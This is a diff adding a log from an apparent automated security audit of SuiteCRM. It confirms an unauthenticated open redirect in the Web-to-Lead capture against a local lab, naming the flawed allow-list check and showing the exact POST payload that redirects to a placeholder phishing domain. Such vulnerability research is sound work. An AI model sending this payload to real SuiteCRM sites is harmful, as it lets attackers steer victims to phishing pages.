@@ -1,0 +1,15 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-005/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-005/../.venv
+========================================================================
+VULN-005: Unauthenticated open redirect in Web-to-Lead capture (default config)
+target: http://localhost:33116
+========================================================================
+[INFO] Target sink: modules/Campaigns/WebToLeadCapture.php:262-272
+[INFO] Root cause: include/utils.php:6439-6469 isWebToLeadAllowedRedirectHost() fail-opens when the allow-list is empty (this lab's live config.php has web_to_lead_allowed_redirect_hosts => array() -- confirmed via `docker compose exec app grep -n web_to_lead config.php`).
+[SETUP] No account, session, or campaign is required -- campaign_id is intentionally omitted so the lead-capture branch (:66-260) is a no-op and control falls straight through to the vulnerable redirect check at :262.
+[STEP] UNAUTH POST http://localhost:33116/index.php?entryPoint=WebToLeadCapture
+[STEP] body: {'redirect': 'https://evil-cvehunter-w2l_4aac3760.example/phish'}
+[PROOF] HTTP 301 Moved Permanently
+[PROOF] Location: 'https://evil-cvehunter-w2l_4aac3760.example/phish'
+[OK] Unauthenticated request redirected the browser off-origin to the attacker URL, verbatim -- fail-open allow-list confirmed live.
+==> VULN-005: CONFIRMED — unauth POST redirected (HTTP 301) to attacker origin https://evil-cvehunter-w2l_4aac3760.example/phish
